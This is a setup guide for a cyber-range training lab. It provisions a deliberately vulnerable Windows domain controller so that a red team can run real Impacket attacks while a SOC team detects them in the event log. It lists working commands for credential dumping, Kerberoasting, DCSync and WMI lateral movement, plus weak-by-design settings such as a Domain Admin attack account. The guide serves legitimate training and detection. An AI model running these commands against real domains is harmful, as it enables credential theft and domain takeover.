# GoalCert Live-Fire — Phase 2: Real Active Directory Lab

Phase 1 (Docker) made network/web/SMB attacks real. **Phase 2 makes the Active-Directory attacks
real**: `cred.lsass`, `cred.kerberoast`, `cred.dcsync` and `lateral.move` execute **real Impacket**
against a **real Windows Server Domain Controller**, and detection comes from the **DC's own Windows
event log** (read over WinRM).

Same engine, same role-based live sessions, same `LabBackend` interface — only the backend changes
(`docker` → `windows_ad`). Nothing in the simulation or Phase 1 is affected.

> **Heads-up — this needs a real Windows VM.** A Domain Controller is ~6 GB to download and needs
> ~6–8 GB RAM. Provisioning takes ~30 min. Unlike Phase 1, it can't be a quick container. The steps
> below make it turnkey; budget time for the first run.

---

## What becomes real in Phase 2

| Live Red action | Tool | Real command | Detection (DC event log) |
|---|---|---|---|
| Dump credentials | Impacket | `impacket-secretsdump DOMAIN/user:pass@dc` | Security 4624 (logon) |
| Kerberoast | Impacket | `impacket-GetUserSPNs -request -dc-ip dc DOMAIN/user:pass` | Security 4769 (TGS request) |
| DCSync | Impacket | `impacket-secretsdump -just-dc DOMAIN/user:pass@dc` | Security 4662 (DRSUAPI replication) |
| Lateral movement | Impacket | `impacket-wmiexec DOMAIN/user:pass@dc whoami` | Sysmon 1 (process create) |

The DCSync action really pulls the domain hashes (incl. `krbtgt`) from the DC. The SOC seat picks up
the detection the same way it does today.

---

## Architecture (how it differs from Phase 1)

- **Attacker runs on the host, not in Docker.** A Docker container can't reach a VirtualBox/VMware
  host-only network, but your host can. So Phase-2 Impacket runs host-native via subprocess
  (`WindowsAdLab.run_in_attacker`). Install attack tools on the host: `pip install impacket`.
- **Detection over WinRM.** `WindowsAdLab.run_in_target` runs PowerShell on the DC over WinRM to count
  the relevant event-log entries. Install `pip install pywinrm` on the host.
- Backend selected by `GOALCERT_LAB_BACKEND=windows_ad`; DC/creds via `GOALCERT_AD_*` env vars
  (defaults match the bundled Vagrantfile).

---

## Step 1 — Stand up a Domain Controller

Pick the path for your machine:

### Windows / Intel Mac — Vagrant + VirtualBox (easiest)
```powershell
winget install Oracle.VirtualBox HashiCorp.Vagrant      # (Windows; on Mac use brew --cask)
cd infrastructure
vagrant up dc01                                          # builds goalcert.local on 192.168.56.10
```
The bundled [Vagrantfile](../infrastructure/Vagrantfile) creates the forest `goalcert.local`,
installs Sysmon, and adds service accounts.

### Apple-Silicon Mac (M1/M2/M3)
VirtualBox can't run x86 Windows here. Use one of:
- A **cloud** Windows Server VM (AWS/Azure, ~$0.10/hr) on a private subnet, or
- **Proxmox** on a mini-PC/server.
Put the DC on a network your Mac can reach, then continue at Step 2.

### Any manual VM (VMware / Hyper-V / cloud)
Install Windows Server, promote it to a DC for `goalcert.local`, set its IP (e.g. 192.168.56.10),
then continue.

---

## Step 2 — Provision the DC for live-fire

Copy [provision-dc.ps1](../infrastructure/provision-dc.ps1) onto the DC and run it **as Administrator**:
```powershell
.\provision-dc.ps1 -AttackUser vagrant
```
This enables WinRM (for detection), installs Sysmon, turns on the audit policy (so DCSync/Kerberos
events fire), adds your attack account to **Domain Admins** (DCSync needs replication rights — demo
lab only), and creates a kerberoastable `svc_sql` account.

> If you used `vagrant up dc01`, you can also just run this once inside the box; it's idempotent.

---

## Step 3 — Tool up the host (the attacker)

On the machine running GoalCert:
```bash
pip install impacket pywinrm
```
Then pre-flight check reachability:
```powershell
pwsh infrastructure/lab-ad-check.ps1 -DcHost 192.168.56.10 -User vagrant -Password vagrant
```
Get all-green before demoing.

---

## Step 4 — Point GoalCert at the AD lab

Set environment (or edit `core/settings.py` defaults), then restart the backend:
```
GOALCERT_LAB_BACKEND=windows_ad
GOALCERT_AD_DC_HOST=192.168.56.10
GOALCERT_AD_DOMAIN=GOALCERT
GOALCERT_AD_USER=vagrant
GOALCERT_AD_PASSWORD=vagrant
```
`GET /api/lab/status` should now show `backend: windows_ad`, `up: true`, `attacker_ready: true`.

---

## Step 5 — Run it

1. Start a live mission (e.g. **Identity Security Assessment**) as host.
2. In the **Live-fire range** panel, confirm the AD lab is up, then **Arm**.
3. Take **Red**, drive the chain to the AD actions, and run **DCSync** / **Kerberoast** — the
   Operation log shows the real Impacket command, the real dumped secrets, and a **DETECTED** badge
   from the DC's event log. SOC works the alert as usual.

---

## Troubleshooting

| Symptom | Fix |
|---|---|
| `status` shows DC not reachable over WinRM | DC VM up? `192.168.56.10:5985` open? Re-run `provision-dc.ps1`. |
| DCSync = "access denied" | The attack account isn't a Domain Admin — re-run `provision-dc.ps1 -AttackUser <acct>`. |
| Attack runs but `detected: false` | Audit policy not applied (re-run provisioning); for lateral, ensure Sysmon is running. |
| `tool not found on host` | `pip install impacket` (and ensure its Scripts dir is on PATH). |
| Detection probe errors | `pip install pywinrm`; confirm WinRM creds (`GOALCERT_AD_WINRM_USER/PASSWORD`). |

## Safety
This is a deliberately vulnerable, isolated lab (the attack account is Domain Admin, auditing/creds are
weak by design). Keep it on a private/host-only network, never domain-join real machines to it, and
snapshot/revert between sessions. Only attack systems you are authorized to test.
